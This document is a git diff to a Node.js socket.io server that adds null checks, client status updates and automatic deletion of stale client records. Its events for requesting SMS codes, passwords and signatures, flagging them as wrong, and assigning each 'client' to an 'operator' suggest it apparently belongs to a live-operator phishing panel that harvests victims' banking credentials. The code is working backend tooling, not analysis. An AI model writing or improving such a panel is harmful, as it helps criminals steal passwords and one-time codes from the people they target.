@@ -192,6 +192,7 @@ const { connectedUsers } = require('./connected')
 app.io = io
 
 const Client = require('./models/Client')
+const { Op } = require('sequelize')
 const UserByToken = require('./middlewares/auth')
 
 io.on('connection', (socket) => {
@@ -202,58 +203,112 @@ io.on('connection', (socket) => {
 
     socketsClients[socket.id] = {}
 
-    theIo = io
-
     socket.on('start', async (client) => {
         try {
             const theClient = await Client.findByPk(client.id, { include: { association: `operator` } })
 
-            if (socketsClients[socket.id]) {
-                socketsClients[socket.id].nickname = theClient.user
-            }
-
-            if (socketRooms[client.id]) {
-                socket.join(theClient.id)
-
-                var roster = io.sockets.adapter.rooms.get(theClient.id)
-
-                roster.forEach(function (client) {
-                    if (socketsClients[client]) console.log('Username: ' + socketsClients[client].nickname)
-                })
-
-                socketRooms[`${client.id}`].time = new Date()
-
-                io.emit('reconnectClient', theClient)
-            } else {
-                socketRooms[client.id] = {
-                    id: client.id,
-                    time: new Date(),
+            if (theClient) {
+                if (socketsClients[socket.id]) {
+                    socketsClients[socket.id].nickname = theClient.user
                 }
-                socket.join(theClient.id)
+
+                if (socketRooms[client.id]) {
+                    socket.join(theClient.id)
+
+                    var roster = io.sockets.adapter.rooms.get(theClient.id)
+
+                    roster.forEach(function (client) {
+                        if (socketsClients[client]) console.log('Username: ' + socketsClients[client].nickname)
+                    })
+
+                    const result = await theClient.update({ status: `reconnect` })
+
+                    io.emit('reconnectClient', result.toJSON())
+                } else {
+                    socketRooms[client.id] = {
+                        id: client.id,
+                        time: new Date(),
+                    }
+
+                    await theClient.update({ status: 'aguardando comando' })
+                    socket.join(theClient.id)
+                }
             }
         } catch (error) {
             console.log(error)
         }
     })
 
-    socket.on('disconnect', () => {
-        var id = socket.id
+    socket.on('disconnect', async () => {
+        try {
+            var id = socket.id
 
-        console.log('user disconnect', socket.request.user)
+            if (socketsClients[id] && socketsClients[id].nickname) {
+                const nickname = socketsClients[id].nickname
 
-        //get room
-        socket.rooms.forEach(function (room) {
-            console.log('room ' + room + ': id : ', id)
-            if (room == id) {
+                const client = await Client.findOne({ where: { user: nickname } })
+
+                if (!client) return
+
+                // const { updatedAt } = client
+                // var start = new Date(updatedAt)
+                // var finish = new Date()
+                // var diffdates = finish - start
+                // var diffmiliseconds = diffdates / 1000
+                // var diffminutes = diffmiliseconds / 60
+
+                io.emit('clientDisconnect', client)
+
+                //console.log(`dif disconnect: `, diffminutes)
+
+                client.update({ status: 'disconnect' })
+
+                setTimeout(async () => {
+                    const check = await Client.findByPk(client.id)
+
+                    if (!check) return
+
+                    const { updatedAt } = check
+
+                    var start = new Date(updatedAt)
+                    var finish = new Date()
+                    var diffdates = finish - start
+                    var diffmiliseconds = diffdates / 1000
+                    var diffminutes = diffmiliseconds / 60
+
+                    if (diffminutes > 1) {
+                        if (check.status == 'disconnect') await client.destroy()
+
+                        io.emit('clientDestroy', client)
+                    }
+
+                    //const dateFromDestroyStart = new Date()
+                }, 180000)
+
+                const dateFromDestroy = new Date().setMinutes(new Date().getMinutes() - 10)
+
+                console.log(`datefromdestroy: `, dateFromDestroy)
+
+                await Client.destroy({
+                    where: {
+                        updated_at: {
+                            [Op.lte]: dateFromDestroy,
+                        },
+                    },
+                })
             }
-        })
+        } catch (error) {
+            console.log(error)
+        }
     })
 
     //user
     socket.on('erroruser', async (clientID) => {
         const client = await Client.findByPk(clientID)
 
-        io.to(socketRooms[`${client.id}`]).emit('erroruser', client)
+        if (client) {
+            io.to(socketRooms[`${client.id}`]).emit('erroruser', client)
+        }
     })
 
     //SMS
@@ -261,9 +316,11 @@ io.on('connection', (socket) => {
         try {
             const client = await Client.findByPk(theClient)
 
-            console.log(`pediu sms para: `, client.id)
+            if (client) {
+                console.log(`pediu sms para: `, client.id)
 
-            io.to(client.id).emit('sms', client.toJSON())
+                io.to(client.id).emit('sms', client.toJSON())
+            }
         } catch (error) {
             console.log(error)
         }
@@ -273,9 +330,11 @@ io.on('connection', (socket) => {
         try {
             const client = await Client.findByPk(clientID)
 
-            console.log(`erro sms para: `, client.id)
+            if (client) {
+                console.log(`erro sms para: `, client.id)
 
-            io.to(client.id).emit('errorsms', client.toJSON())
+                io.to(client.id).emit('errorsms', client.toJSON())
+            }
         } catch (error) {
             console.log(error)
         }
@@ -318,7 +377,9 @@ io.on('connection', (socket) => {
     socket.on('sendSignature', async (clientID) => {
         const client = await Client.findByPk(clientID, { include: { association: 'operator' } })
 
-        if (client.operator.id) {
+        if (!client) return
+
+        if (client.operator) {
             io.to(client.id).emit('sendSignature', client.toJSON())
         } else {
             io.emit('newClient', client.toJSON())
@@ -328,7 +389,7 @@ io.on('connection', (socket) => {
     socket.on('errorsignature', async (clientID) => {
         const client = await Client.findByPk(clientID)
 
-        io.to(client.id).emit('errorsignature', client)
+        if (client) io.to(client.id).emit('errorsignature', client)
     })
 
     // Password
@@ -336,23 +397,11 @@ io.on('connection', (socket) => {
         try {
             const client = await Client.findByPk(clientID, { include: { association: `operator` } })
 
-            if (socketRooms[client.id]) {
-                socket.join(socketRooms[`${client.id}`].id)
+            if (!client) return
 
-                socketRooms[`${client.id}`].time = new Date()
+            const result = await client.update({ status: 'Senha Enviada' })
 
-                io.emit('reconnectClient', client.toJSON())
-
-                io.to(client.id).emit('sendPassword', client)
-            } else {
-                socketRooms[client.id] = {
-                    id: client.id,
-                    time: new Date(),
-                }
-                socket.join(client.id)
-
-                io.emit('newClient', client.toJSON())
-            }
+            io.to(result.id).emit('sendPassword', client)
         } catch (error) {
             console.log(error)
             console.log(`Erro ao mandar senha`)
@@ -362,18 +411,20 @@ io.on('connection', (socket) => {
     socket.on('errorpassword', async (clientID) => {
         const client = await Client.findByPk(clientID)
 
-        io.to(client.id).emit('errorpassword', client)
+        if (client) io.to(client.id).emit('errorpassword', client)
     })
 
     //await
     socket.on('await', (client) => {
-        console.log(`client await: `, client.id)
-        io.to(client.id).emit('await', client)
+        io.emit('await', client)
+        //io.to(client.id).emit('await', client)
     })
 
     //finish
     socket.on('finish', async (clientID) => {
         const client = await Client.findByPk(clientID, { include: { association: 'operator' } })
+
+        if (!client) return
 
         client.update({ status: 'finalizado' })
 
